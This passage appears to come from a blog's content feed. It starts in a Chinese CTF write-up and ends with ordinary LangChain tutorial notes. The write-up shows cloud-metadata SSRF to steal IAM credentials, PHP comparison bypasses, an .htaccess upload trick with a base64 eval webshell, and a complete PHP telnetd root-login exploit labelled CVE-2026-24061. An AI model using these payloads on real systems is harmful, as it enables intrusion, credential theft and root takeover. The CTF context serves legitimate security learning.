S3 存储桶）获取 Flag<br>获取EC2 实例绑定的IAM角色<code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code><br><img src="/postdata/POFP2026%E9%82%80%E8%AF%B7%E8%B5%9BWP/4.png" alt="4"><br>发现<code>/admin-role</code><br>获取flag<br><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role</code><br><img src="/postdata/POFP2026%E9%82%80%E8%AF%B7%E8%B5%9BWP/5.png" alt="5"><br><code>POFP{999b6c55-e809-48b2-9d79-756520ddb349}</code></p><h2 id="【Web】ezmd5"><a href="#【Web】ezmd5" class="headerlink" title="【Web】ezmd5"></a>【Web】ezmd5</h2><h3 id="【解题思路】-4"><a href="#【解题思路】-4" class="headerlink" title="【解题思路】"></a>【解题思路】</h3><p>PHP弱比较，使用数组绕过</p><h3 id="【解题步骤】-3"><a href="#【解题步骤】-3" class="headerlink" title="【解题步骤】"></a>【解题步骤】</h3><p><img src="/postdata/POFP2026%E9%82%80%E8%AF%B7%E8%B5%9BWP/6.png" alt="6"><br>Post传入<code>user[]=1&amp;&amp;pass[]=2</code><br>获得flag<br><code>POFP{ada612ba-b4d1-4e5d-a695-cef1b5ca2a36}</code></p><h2 id="【Web】SSO-Drive"><a href="#【Web】SSO-Drive" class="headerlink" title="【Web】SSO Drive"></a>【Web】SSO Drive</h2><h3 id="【解题思路】-5"><a href="#【解题思路】-5" class="headerlink" title="【解题思路】"></a>【解题思路】</h3><p>源码泄露审计 -&gt; SSO 认证绕过 -&gt; 绕过严格的文件上传限制 -&gt; 利用陈旧的远程管理服务 RCE</p><h3 id="【解题步骤】-4"><a href="#【解题步骤】-4" class="headerlink" title="【解题步骤】"></a>【解题步骤】</h3><p><img src="/postdata/POFP2026%E9%82%80%E8%AF%B7%E8%B5%9BWP/7.png" alt="7"><br>通过Wappalyzer发现是Apache PHP<br>访问<code>index.php.bak</code>，发现有备用文件<br><img src="/postdata/POFP2026%E9%82%80%E8%AF%B7%E8%B5%9BWP/8.png" alt="8"><br>strcmp 数组绕过<br>POST传入<code>username=admin&amp;password[]=</code>绕过登录<br><img src="/postdata/POFP2026%E9%82%80%E8%AF%B7%E8%B5%9BWP/9.png" alt="9"><br><img src="/postdata/POFP2026%E9%82%80%E8%AF%B7%E8%B5%9BWP/10.png" alt="10"></p><p>进入dashboard.php，文件上传，试了一下，有白名单waf，大概只能上传jpg,png,.htaccess<br>由于是Apache文件上传，而且允许上传配置文件<br>猜测应该上传图片马<br>经测试，后端含有后端含有mine类型<br>于是我们上传.htaccess</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line">AddType application/x-httpd-php .png</span><br><span class="line">php_value auto_append_file &quot;php://filter/read=convert.base64-decode/resource=shell.png&quot;</span><br></pre></td></tr></table></figure><p>在上传假图片shell.png</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define width 13337</span><br><span class="line">#define height 1337</span><br><span class="line">PD9waHAgQGV2YWwoJF9QT1NUWycxMjM0J10pOz8+</span><br></pre></td></tr></table></figure><p><img src="/postdata/POFP2026%E9%82%80%E8%AF%B7%E8%B5%9BWP/11.png" alt="11"><br><img src="/postdata/POFP2026%E9%82%80%E8%AF%B7%E8%B5%9BWP/12.png" alt="12"><br>使用蚁剑连接<br><code>/start.sh</code>发现所有flag<br><img src="/postdata/POFP2026%E9%82%80%E8%AF%B7%E8%B5%9BWP/13.png" alt="13"><br>Flag3需要提权<br>经测试，发现需要利用xinetd，是<code>CVE-2026-24061</code><br>通过蚁剑创建php文件，并运行<br><img src="/postdata/POFP2026%E9%82%80%E8%AF%B7%E8%B5%9BWP/14.png" alt="14"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="number">23</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) <span class="keyword">die</span>(<span class="string">&quot;[-] Connect failed\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$fp</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[+] Connected! Starting intelligent negotiation...\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload_sent</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$start</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">time</span>() - <span class="variable">$start</span> &lt; <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>, <span class="number">4096</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$data</span>) &#123;</span><br><span class="line">        <span class="comment">// 逐字节解析协议，确保不漏掉任何一个请求</span></span><br><span class="line">        <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="comment">// 找到 IAC (0xFF)</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]) == <span class="number">0xFF</span>) &#123;</span><br><span class="line">                <span class="comment">// 确保后面有足够的字节</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$i</span> + <span class="number">2</span> &lt; <span class="variable">$len</span>) &#123;</span><br><span class="line">                    <span class="variable">$cmd</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>+<span class="number">1</span>]);</span><br><span class="line">                    <span class="variable">$opt</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>+<span class="number">2</span>]);</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment">// 如果服务端发送 DO (0xFD)</span></span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$cmd</span> == <span class="number">0xFD</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$opt</span> == <span class="number">0x27</span>) &#123; </span><br><span class="line">                            <span class="comment">// 针对 NEW_ENVIRON (27)，回复 WILL (FB)</span></span><br><span class="line">                            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;\xff\xfb\x27&quot;</span>);</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;[+] Reply: WILL NEW_ENVIRON\n&quot;</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="comment">// 针对其他所有 (TSPEED 20, TTYPE 18等)，回复 WONT (FC)</span></span><br><span class="line">                            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;\xff\xfc&quot;</span> . <span class="title function_ invoke__">chr</span>(<span class="variable">$opt</span>));</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;[+] Reply: WONT Option <span class="subst">$opt</span>\n&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable">$i</span> += <span class="number">2</span>; <span class="comment">// 跳过已处理的指令</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 如果服务端发送 WILL (0xFB) -&gt; 我们回复 DONT (0xFE)</span></span><br><span class="line">                    <span class="keyword">elseif</span> (<span class="variable">$cmd</span> == <span class="number">0xFB</span>) &#123;</span><br><span class="line">                        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;\xff\xfe&quot;</span> . <span class="title function_ invoke__">chr</span>(<span class="variable">$opt</span>));</span><br><span class="line">                        <span class="variable">$i</span> += <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 打印非协议文本 (Flag可能会在这里)</span></span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^\x20-\x7E]/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$text</span>) <span class="keyword">echo</span> <span class="string">&quot;Output: <span class="subst">$text</span>\n&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;flag&quot;</span>) !== <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;GZCTF&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">             <span class="keyword">exit</span>(<span class="string">&quot;\n[!!!] FLAG FOUND [!!!]\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 发送 Payload</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$payload_sent</span>) &#123;</span><br><span class="line">            <span class="comment">// 稍等一下让协商生效</span></span><br><span class="line">            <span class="title function_ invoke__">usleep</span>(<span class="number">200000</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;[!] Injecting CVE-2026-24061 Payload...\n&quot;</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 使用 USERVAR (0x03) 格式，这是 Linux telnetd 最认的格式</span></span><br><span class="line">            <span class="comment">// IAC SB NEW_ENVIRON IS USERVAR &quot;USER&quot; VALUE &quot;-f root&quot; IAC SE</span></span><br><span class="line">            <span class="variable">$exploit</span> = <span class="string">&quot;\xff\xfa\x27\x00\x03USER\x01-f root\xff\xf0&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$exploit</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 紧接着发送命令</span></span><br><span class="line">            <span class="title function_ invoke__">usleep</span>(<span class="number">100000</span>);</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;\n/usr/bin/id; /bin/cat /root/flag3;\n&quot;</span>);</span><br><span class="line">            <span class="variable">$payload_sent</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">usleep</span>(<span class="number">50000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在蚁剑终端运行<code>php 1.php</code><br><img src="/postdata/POFP2026%E9%82%80%E8%AF%B7%E8%B5%9BWP/15.png" alt="15"><br>找到第三段flag<br><code>-5cf8e09d78a7}</code><br>和前两段拼在一块<br><img src="/postdata/POFP2026%E9%82%80%E8%AF%B7%E8%B5%9BWP/16.png" alt="16"><br><code>POFP{5610a036-</code><br><img src="/postdata/POFP2026%E9%82%80%E8%AF%B7%E8%B5%9BWP/17.png" alt="17"><br><code>aa89-45bb-aa29</code><br>获得flag<br><code>POFP{5610a036-aa89-45bb-aa29-5cf8e09d78a7}</code></p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LangChain学习记录260204-高级概念</title>
      <link href="/posts/315c14a9/"/>
      <url>/posts/315c14a9/</url>
      
        <content type="html"><![CDATA[<h3 id="高级概念"><a href="#高级概念" class="headerlink" title="高级概念"></a>高级概念</h3><p>接下来是比基础知识高级一点的概念</p><h3 id="结构化输出"><a href="#结构化输出" class="headerlink" title="结构化输出"></a>结构化输出</h3><p>LangChain通过<code>response_format</code>参数提供结构化输出策略。</p><h4 id="ToolStrategy"><a href="#ToolStrategy" class="headerlink" title="ToolStrategy"></a>ToolStrategy</h4><p><code>ToolStrategy</code>使用人工工具调用生成结构化输出。这适用于任何支持工具调用的模型：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pydantic <span class="keyword">import</span> BaseModel</span><br><span class="line"><span class="keyword">from</span> langchain.agents <span class="keyword">import</span> create_agent</span><br><span class="line"><span class="keyword">from</span> langchain.agents.structured_output <span class="keyword">import</span> ToolStrategy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ContactInfo</span>(<span class="title class_ inherited__">BaseModel</span>):</span><br><span class="line">    name: <span class="built_in">str</span></span><br><span class="line">    email: <span class="built_in">str</span></span><br><span class="line">    phone: <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line">agent = create_agent(</span><br><span class="line">    model=<span class="string">&quot;openai:gpt-4o-mini&quot;</span>,</span><br><span class="line">    tools=[search_tool],</span><br><span class="line">    response_format=ToolStrategy(ContactInfo)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">result = agent.invoke(&#123;</span><br><span class="line">    <span class="string">&quot;messages&quot;</span>: [&#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;从以下内容提取联系信息：John Doe, john@example.com, (555) 123-4567&quot;</span>&#125;]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">result[<span class="string">&quot;structured_response&quot;</span>]</span><br><span class="line"><span class="comment"># ContactInfo(name=&#x27;John Doe&#x27;, email=&#x27;john@example.com&#x27;, phone=&#x27;(555) 123-4567&#x27;)</span></span><br></pre></td></tr></table></figure><h4 id="ProviderStrategy"><a href="#ProviderStrategy" class="headerlink" title="ProviderStrategy"></a>ProviderStrategy</h4><p><code>ProviderStrategy</code>使用模型提供商的原生结构化输出生成。这更可靠，但仅适用于支持原生结构化输出的提供商（例如 OpenAI）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain.agents.structured_output <span class="keyword">import</span> ProviderStrategy</span><br><span class="line"></span><br><span class="line">agent = create_agent(</span><br><span class="line">    model=<span class="string">&quot;openai:gpt-4o&quot;</span>,</span><br><span class="line">    response_format=ProviderStrategy(ContactInfo)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="记忆"><a href="#记忆" class="headerlink" title="记忆"></a>记忆</h3><p>Agents通过消息状态自动维护对话历史。可以通过配置Agents使用自定义状态模式，在对话期间记住额外信息。<br>存储在状态中的信息可以被视为Agents的短期记忆<br>自定义状态模式必须扩展<code>AgentState</code>作为<code>TypedDict</code>。<br>定义自定义状态有两种方式：</p><ul><li>通过 中间件（推荐）</li><li>通过<code>create_agent</code>上的<code>state_schema</code></li></ul><h4 id="通过中间件定义状态"><a href="#通过中间件定义状态" class="headerlink" title="通过中间件定义状态"></a>通过中间件定义状态</h4><p>当自定义状态需要被特定中间件钩子和附加到该中间件的工具访问时，使用中间件定义自定义状态。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain.agents <span class="keyword">import</span> AgentState</span><br><span class="line"><span class="keyword">from</span> langchain.agents.middleware <span class="keyword">import</span> AgentMiddleware</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CustomState</span>(<span class="title class_ inherited__">AgentState</span>):</span><br><span class="line">    user_preferences: <span class="built_in">dict</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CustomMiddleware</span>(<span class="title class_ inherited__">AgentMiddleware</span>):</span><br><span class="line">    state_schema = CustomState</span><br><span class="line">    tools = [tool1, tool2]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">before_model</span>(<span class="params">self, state: CustomState, runtime</span>) -&gt; <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>] | <span class="literal">None</span>:</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">agent = create_agent(</span><br><span class="line">    model,</span><br><span class="line">    tools=tools,</span><br><span class="line">    middleware=[CustomMiddleware()]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Agents现在可以跟踪消息之外的额外状态</span></span><br><span class="line">result = agent.invoke(&#123;</span><br><span class="line">    <span class="string">&quot;messages&quot;</span>: [&#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;我更喜欢技术性解释&quot;</span>&#125;],</span><br><span class="line">    <span class="string">&quot;user_preferences&quot;</span>: &#123;<span class="string">&quot;style&quot;</span>: <span class="string">&quot;technical&quot;</span>, <span class="string">&quot;verbosity&quot;</span>: <span class="string">&quot;detailed&quot;</span>&#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="通过state-schema定义状态"><a href="#通过state-schema定义状态" class="headerlink" title="通过state_schema定义状态"></a>通过<code>state_schema</code>定义状态</h4><p>使用<code>state_schema</code>参数作为快捷方式，定义仅在工具中使用的自定义状态。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain.agents <span class="keyword">import</span> AgentState</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CustomState</span>(<span class="title class_ inherited__">AgentState</span>):</span><br><span class="line">    user_preferences: <span class="built_in">dict</span></span><br><span class="line"></span><br><span class="line">agent = create_agent(</span><br><span class="line">    model,</span><br><span class="line">    tools=[tool1, tool2],</span><br><span class="line">    state_schema=CustomState</span><br><span class="line">)</span><br><span class="line"><span class="comment"># Agents现在可以跟踪消息之外的额外状态</span></span><br><span class="line">result = agent.invoke(&#123;</span><br><span class="line">    <span class="string">&quot;messages&quot;</span>: [&#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;我更喜欢技术性解释&quot;</span>&#125;],</span><br><span class="line">    <span class="string">&quot;user_preferences&quot;</span>: &#123;<span class="string">&quot;style&quot;</span>: <span class="string">&quot;technical&quot;</span>, <span class="string">&quot;verbosity&quot;</span>: <span class="string">&quot;detailed&quot;</span>&#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="流式传输"><a href="#流式传输" class="headerlink" title="流式传输"></a>流式传输</h3><p>如果Agents执行多个步骤，这可能需要一段时间。为了显示中间进度，我们可以随着消息的发生而流式传回。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> chunk <span class="keyword">in</span> agent.stream(&#123;</span><br><span class="line">    <span class="string">&quot;messages&quot;</span>: [&#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;搜索 AI 新闻并总结发现&quot;</span>&#125;]</span><br><span class="line">&#125;, stream_mode=<span class="string">&quot;values&quot;</span>):</span><br><span class="line">    <span class="comment"># 每个块包含该时间点的完整状态</span></span><br><span class="line">    latest_message = chunk[<span class="string">&quot;messages&quot;</span>][-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> latest_message.content:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Agents：<span class="subst">&#123;latest_message.content&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> latest_message.tool_calls:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;正在调用工具：<span class="subst">&#123;[tc[<span class="string">&#x27;name&#x27;</span>] <span class="keyword">for</span> tc <span class="keyword">in</span> latest_message.tool_calls]&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h3><p>中间件 为在执行的不同阶段自定义Agents行为提供了强大的扩展性。可以使用中间件来：</p><ul><li>在调用模型之前处理状态（例如消息裁剪、上下文注入）</li><li>修改或验证模型的响应（例如防护栏、内容过滤）</li><li>使用自定义逻辑处理工具执行错误</li><li>基于状态或上下文实现动态模型选择</li><li>添加自定义日志、监控或分析<br>中间件无缝集成到Agents的执行图中，允许在关键点拦截和修改数据流，而无需更改核心Agents逻辑。</li></ul>]]></content>
      
      
      <categories>
          
          <category> GYBot制作计划 </category>
          
          <category> LangChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LangChain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LangChain学习记录260203-基础知识</title>
      <link href="/posts/5d33a59b/"/>
      <url>/posts/5d33a59b/</url>
      
        <content type="html"><![CDATA[<p>为满足GYBot的更新需求，现来学习<a href="https://reference.langchain.com/python/langchain/" title="官网传送">LangChain v1.0</a></p><h3 id="Agents"><a href="#Agents" class="headerlink" title="Agents"></a>Agents</h3><p>Agents能将大模型与工具结合，让大模型经过推理，决定使用工具，来解决问题<br>Agents会一直运行，直到满足停止条件——即模型输出最终结果或达到迭代次数限制。<br><img src="/postdata/LangChain学习记录260203/1.svg" alt="Agents" style="width: 200px; height: 400px;"></p><h3 id="核心组件"><a href="#核心组件" class="headerlink" title="核心组件"></a>核心组件</h3><h4 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h4><p>即大模型，可以看成Agents的大脑</p><h5 id="静态模型"><a href="#静态模型" class="headerlink" title="静态模型"></a>静态模型</h5><p>静态模型在创建Agents时配置一次，并在整个执行过程中保持不变。这是最常见且直接的方法。<br>从 模型标识符字符串 初始化静态模型：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain.agents <span class="keyword">import</span> create_agent</span><br><span class="line"></span><br><span class="line">agent = create_agent(</span><br><span class="line">    <span class="string">&quot;openai:gpt-5&quot;</span>,</span><br><span class="line">    tools=tools</span><br><span class="line">)</span><br></pre></td></tr></table></figure><blockquote><p><strong>提示</strong><br>模型标识符字符串支持自动推断（例如 “gpt-5” 将被推断为 “openai:gpt-5”）。请参考<a href="https://reference.langchain.com/python/langchain/models/#langchain.chat_models.init_chat_model(model_provider)">参考文档</a> 查看完整的模型标识符字符串映射列&gt;&gt;表。<br>官方文档使用OpenAi举例：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain.agents <span class="keyword">import</span> create_agent</span><br><span class="line"><span class="keyword">from</span> langchain_openai <span class="keyword">import</span> ChatOpenAI</span><br><span class="line"></span><br><span class="line">model = ChatOpenAI(</span><br><span class="line">    model=<span class="string">&quot;gpt-5&quot;</span>,</span><br><span class="line">    temperature=<span class="number">0.1</span>,</span><br><span class="line">    max_tokens=<span class="number">1000</span>,</span><br><span class="line">    timeout=<span class="number">30</span></span><br><span class="line">    <span class="comment"># ...（其他参数）</span></span><br><span class="line">)</span><br><span class="line">agent = create_agent(model, tools=tools)</span><br></pre></td></tr></table></figure><h5 id="动态模型"><a href="#动态模型" class="headerlink" title="动态模型"></a>动态模型</h5><p>动态模型在运行时根据当前状态和上下文进行选择。<br>要使用动态模型，请使用<code>@wrap_model_call</code>装饰器创建中间件，以修改请求中的模型：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain_openai <span class="keyword">import</span> ChatOpenAI</span><br><span class="line"><span class="keyword">from</span> langchain.agents <span class="keyword">import</span> create_agent</span><br><span class="line"><span class="keyword">from</span> langchain.agents.middleware <span class="keyword">import</span> wrap_model_call, ModelRequest, ModelResponse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">basic_model = ChatOpenAI(model=<span class="string">&quot;gpt-4o-mini&quot;</span>)</span><br><span class="line">advanced_model = ChatOpenAI(model=<span class="string">&quot;gpt-4o&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@wrap_model_call</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dynamic_model_selection</span>(<span class="params">request: ModelRequest, handler</span>) -&gt; ModelResponse:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;根据对话复杂性选择模型。&quot;&quot;&quot;</span></span><br><span class="line">    message_count = <span class="built_in">len</span>(request.state[<span class="string">&quot;messages&quot;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> message_count &gt; <span class="number">10</span>:</span><br><span class="line">        <span class="comment"># 对较长的对话使用高级模型</span></span><br><span class="line">        model = advanced_model</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        model = basic_model</span><br><span 